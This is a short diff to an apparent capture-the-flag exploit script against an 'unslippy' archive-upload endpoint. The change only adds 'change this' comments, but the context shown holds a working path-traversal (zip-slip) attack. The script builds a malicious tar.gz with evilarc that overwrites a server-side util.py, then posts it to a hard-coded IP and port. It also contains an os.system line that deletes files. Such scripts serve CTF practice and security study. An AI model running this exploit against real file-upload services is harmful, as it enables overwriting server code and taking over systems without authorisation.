@@ -9,7 +9,7 @@
  import requests, os, json, time
 s = requests.session()
 
-ip_port = '64.227.40.93:32528'
+ip_port = '64.227.40.93:32528' # change this
 url = 'http://%s/api/unslippy'%ip_port
 util = '''
 import functools, tarfile, tempfile, os
@@ -22,7 +22,7 @@ def extract_from_archive(file):
 ''' 
 
 open('util.py','w').write(util)
-path_evilary = '~/evilarc/evilarc.py'
+path_evilary = '~/evilarc/evilarc.py' # change  this
 os.system('rm flag.tar.gz ; python2 %s -d 3 -o u -f flag.tar.gz util.py'%path_evilary)
 s.post(url,files={'file':open('flag.tar.gz','rb')})
 time.sleep(2)
